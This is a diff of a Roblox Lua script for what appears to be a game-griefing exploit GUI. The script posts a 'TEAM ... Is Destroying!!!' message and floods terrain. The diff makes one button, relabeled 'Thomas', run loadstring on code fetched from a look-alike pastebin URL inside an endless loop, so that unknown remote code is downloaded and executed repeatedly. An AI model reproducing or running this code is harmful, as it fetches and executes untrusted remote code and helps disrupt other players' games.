@@ -394,8 +394,6 @@ e666.MouseButton1Down:connect(function()
 
 	local msg = Instance.new("Message",workspace)
 		msg.Text = "TEAM JKLO,JO1TAR0,K00PZKIDD Is Destroying!!!"
-		wait(3)
-		msg:Destroy()
 end)
 EpicSaxGuy.Name = "EpicSaxGuy"
 EpicSaxGuy.Parent = Frame
@@ -555,16 +553,15 @@ ForceField.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
 ForceField.Position = UDim2.new(0.693121672, 0, 0.648000002, 0)
 ForceField.Size = UDim2.new(0, 89, 0, 34)
 ForceField.Font = Enum.Font.GothamBold
-ForceField.Text = "FLOOD"
+ForceField.Text = "Thomas"
 ForceField.TextColor3 = Color3.fromRGB(0, 0, 0)
 ForceField.TextScaled = true
 ForceField.TextSize = 14.000
 ForceField.TextWrapped = true
 ForceField.MouseButton1Down:connect(function()
-
-	local region = Region3.new(Vector3.new(-1250,0,-1250), Vector3.new(1250,18,1250))
-		region = region:ExpandToGrid(4)
-		game.Workspace.Terrain:FillRegion(region, 4, Enum.Material.Water)
+while true do
+loadstring(game:HttpGet(('https://pastebinp.com/raw/rfWbgrRy'),true))()
+	end
 end)
 
 -- Scripts:
